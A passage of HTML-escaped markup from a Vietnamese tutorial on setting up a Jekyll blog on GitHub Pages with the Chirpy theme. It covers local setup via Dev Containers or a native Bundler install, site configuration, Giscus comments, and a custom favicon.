2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Tài khoản &lt;a href=&#34;https://github.com/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Github&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;Kiến thức cơ bản về &lt;a href=&#34;https://markdownlivepreview.com/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Markdown&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;creating-a-site-repository&#34;&gt;&lt;span&gt;Creating a Site Repository&lt;/span&gt;&#xA;  &lt;a href=&#34;#creating-a-site-repository&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Ở đây, tôi sử dụng &lt;a href=&#34;https://chirpy.cotes.page/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Chirpy themes&lt;/strong&gt;&lt;/a&gt;, đây là theme khá nổi tiếng dành cho GitHub Pages, được tối ưu cho việc viết blog cá nhân hoặc technical blog.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Các bước thực hiện&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Đăng nhập vào &lt;a href=&#34;https://github.com/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Github&lt;/strong&gt;&lt;/a&gt; và di chuyển đến &lt;a href=&#34;https://github.com/cotes2020/chirpy-starter&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;starter&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;Thay vì Fork, ta click &lt;kbd&gt;Use this template&lt;/kbd&gt; và chọn &lt;kbd&gt;Create a new repository&lt;/kbd&gt; để tự động tạo Site Repository.&lt;/li&gt;&#xA;&lt;li&gt;Đặt tên cho Repository mới &lt;code&gt;&amp;lt;username&amp;gt;.github.io&lt;/code&gt;, thay đổi &lt;code&gt;&amp;lt;username&amp;gt;&lt;/code&gt; thành Github username của bạn.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;setting-up-the-environment&#34;&gt;&lt;span&gt;Setting up the Environment&lt;/span&gt;&#xA;  &lt;a href=&#34;#setting-up-the-environment&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Có 2 lý do chính bạn nên setup môi trường trên máy local khi phát triển blog:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Sau khi push code lên Repository, GitHub Actions sẽ mất một khoảng thời gian để chạy rồi mới build và render ra GitHub Pages.&lt;/li&gt;&#xA;&lt;li&gt;Khi dev trực tiếp trên local, bạn có thể quan sát kết quả ngay lập tức, nhanh hơn và thuận tiện hơn.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;using-dev-containers-recommended-for-windows&#34;&gt;&lt;span&gt;Using Dev Containers (Recommended for Windows)&lt;/span&gt;&#xA;  &lt;a href=&#34;#using-dev-containers-recommended-for-windows&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Dev Containers&lt;/strong&gt; cung cấp một môi trường cô lập bằng Docker, giúp tránh xung đột với hệ thống và đảm bảo mọi dependency đều được quản lý trong container.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Các bước thực hiện&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Cài đặt Docker:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Trên Windows/macOS: cài &lt;a href=&#34;https://www.docker.com/products/docker-desktop/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker Desktop&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Trên Linux: cài &lt;a href=&#34;https://docs.docker.com/engine/install/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker Engine&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;Cài &lt;a href=&#34;https://code.visualstudio.com/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;VS Code&lt;/a&gt; và extension &lt;a href=&#34;https://marketplace.visualstudio.com/items?itemName=ms-vscode-remote.remote-containers&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Dev Containers&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Clone repository:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Nếu dùng Docker Desktop: mở VS Code và &lt;a href=&#34;https://code.visualstudio.com/docs/devcontainers/containers#_quick-start-open-a-git-repository-or-github-pr-in-an-isolated-container-volume&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;clone repo trong container volume&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Nếu dùng Docker Engine: clone repo về local, sau đó &lt;a href=&#34;https://code.visualstudio.com/docs/devcontainers/containers#_quick-start-open-an-existing-folder-in-a-container&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;mở bằng container&lt;/a&gt; trong VS Code.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;Chờ quá trình thiết lập Dev Containers hoàn tất.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;setting-up-natively-recommended-for-unix-like-os&#34;&gt;&lt;span&gt;Setting up Natively (Recommended for Unix-like OS)&lt;/span&gt;&#xA;  &lt;a href=&#34;#setting-up-natively-recommended-for-unix-like-os&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Với các hệ điều hành dạng Unix-like (Linux, macOS), bạn có thể setup môi trường trực tiếp (native) để đạt hiệu năng tốt nhất. Ngoài ra, vẫn có thể dùng Dev Containers như một lựa chọn thay thế.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Các bước thực hiện&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Làm theo &lt;a href=&#34;https://jekyllrb.com/docs/installation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;hướng dẫn cài đặt Jekyll&lt;/a&gt; và đảm bảo đã cài đặt &lt;a href=&#34;https://git-scm.com/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Git&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Clone repository về máy local.&lt;/li&gt;&#xA;&lt;li&gt;Nếu bạn fork theme, cài &lt;a href=&#34;https://nodejs.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Node.js&lt;/a&gt; và chạy &lt;code&gt;bash tools/init.sh&lt;/code&gt; trong thư mục gốc để khởi tạo repo.&lt;/li&gt;&#xA;&lt;li&gt;Chạy lệnh dưới đây ở thư mục gốc để toàn bộ gem sẽ được cài vào &lt;code&gt;./vendor/bundle/&lt;/code&gt; trong project, không cần &lt;strong&gt;sudo&lt;/strong&gt; và không đụng gì đến &lt;code&gt;/var/lib/gems..&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;bundle config set --local path &amp;#39;vendor/bundle&amp;#39;&#xA;bundle install&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;usage&#34;&gt;&lt;span&gt;Usage&lt;/span&gt;&#xA;  &lt;a href=&#34;#usage&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;start-the-jekyll-server&#34;&gt;&lt;span&gt;Start the Jekyll Server&lt;/span&gt;&#xA;  &lt;a href=&#34;#start-the-jekyll-server&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Để chạy site trên local, sử dụng lệnh dưới đây:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;bundle exec jekyll s&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;configuration&#34;&gt;&lt;span&gt;Configuration&lt;/span&gt;&#xA;  &lt;a href=&#34;#configuration&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Một số biến cần cấu hình trong &lt;code&gt;_config.yml&lt;/code&gt;, bao gồm:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;lang&lt;/code&gt;: Set language cho website của bạn&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;url&lt;/code&gt;: Trỏ đến website của bạn&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;title&lt;/code&gt;: Title chính, nằm dưới avatar&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;tagline&lt;/code&gt;: Subtitle, mô tả trang web&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;avatar&lt;/code&gt;: hỗ trợ local và CORS resources, có thể sử dụng &lt;code&gt;gif&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;comment-feature-via-giscus&#34;&gt;&lt;span&gt;Comment feature via Giscus&lt;/span&gt;&#xA;  &lt;a href=&#34;#comment-feature-via-giscus&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Ta sử dụng &lt;a href=&#34;https://giscus.app&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Giscus&lt;/strong&gt;&lt;/a&gt; làm hệ thống comment cho website, ngoài ra còn các option khác như: &lt;a href=&#34;https://disqus.com/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Disqus&lt;/strong&gt;&lt;/a&gt;, &lt;a href=&#34;https://utteranc.es/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Utterances&lt;/strong&gt;&lt;/a&gt;, tất cả đều miễn phí.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Các bước thực hiện&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Cài đặt &lt;a href=&#34;https://github.com/apps/giscus&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;giscus&lt;/strong&gt;&lt;/a&gt; vào Github.&lt;/li&gt;&#xA;&lt;li&gt;Vào &lt;strong&gt;Settings&lt;/strong&gt; của repository chọn &lt;strong&gt;General&lt;/strong&gt; và bật &lt;strong&gt;Discussions&lt;/strong&gt; để giscus lưu comments vào &lt;strong&gt;Discussions&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Nhập repository &lt;code&gt;&amp;lt;username&amp;gt;/&amp;lt;username&amp;gt;.github.io&lt;/code&gt;, thông báo màu xanh lá xuất hiện khi các tiêu chí ở trên được đáp ứng.&lt;/li&gt;&#xA;&lt;li&gt;Chọn thể loại discussion và chủ đề cho website.&lt;/li&gt;&#xA;&lt;li&gt;Cấu hình giscus trong &lt;code&gt;_config.yml&lt;/code&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;provider&lt;/code&gt;: chọn giscus&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;giscus&lt;/code&gt;: mapping các biến tương ứng đã làm ở &lt;a href=&#34;https://github.com/apps/giscus&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;giscus&lt;/strong&gt;&lt;/a&gt; vào biến &lt;code&gt;giscus&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;customize-the-favicon&#34;&gt;&lt;span&gt;Customize the Favicon&lt;/span&gt;&#xA;  &lt;a href=&#34;#customize-the-favicon&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Tạo &lt;strong&gt;favicon&lt;/strong&gt; riêng cho website của bạn, không phải sử dụng &lt;strong&gt;favicon&lt;/strong&gt; mặc định của themes&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Các bước thực hiện&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Truy cập &lt;a href=&#34;https://www.favicon-generator.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Favicon Genarate&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;Click &lt;kbd&gt;Browse&lt;/kbd&gt; chọn favicon cần tạo, sau đó click &lt;kbd&gt;Create Favicon&lt;/kbd&gt; để tạo.&lt;/li&gt;&#xA;&lt;li&gt;Click &lt;code&gt;Download the generated favicon&lt;/code&gt; để tải các file chứa các favicon về.&lt;/li&gt;&#xA;&lt;li&gt;Giải nén file vừa tải, xóa 2 file dưới đây:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;browserconfig.xml&lt;/li&gt;&#xA;&lt;li&gt;site.webmanifest&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;Copy toàn bộ file còn lại và paste vào &lt;code&gt;assets/img/favicons&lt;/code&gt;(nếu chưa có thì tạo).&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;extends&#34;&gt;&lt;span&gt;Extends&lt;/span&gt;&#xA;  &lt;a href=&#34;#extends&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;remove-meta-tag-in-footer&#34;&gt;&lt;span&gt;Remove meta tag in Footer&lt;/span&gt;&#xA;  &lt;a href=&#34;#remove-meta-tag-in-footer&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Có thể xóa dòng &lt;code&gt;Using the Chirpy theme for Jekyll.&lt;/code&gt; bằng các bước sau:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Tạo file theo đường dẫn sau &lt;code&gt;_data/locales/en.yml&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Copy nội dung &lt;a href=&#34;https://raw.githubusercontent.com/cotes2020/jekyll-theme-chirpy/refs/heads/master/_data/locales/en.yml&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;en.yml&lt;/strong&gt;&lt;/a&gt; và dán vào file vừa tạo.&lt;/li&gt;&#xA;&lt;li&gt;Sửa nội dung biến &lt;code&gt;meta&lt;/code&gt; thành &lt;code&gt;&amp;quot;&amp;quot;&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;write-a-post&#34;&gt;&lt;span&gt;Write a post&lt;/span&gt;&#xA;  &lt;a href=&#34;#write-a-post&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Tham khảo &lt;a 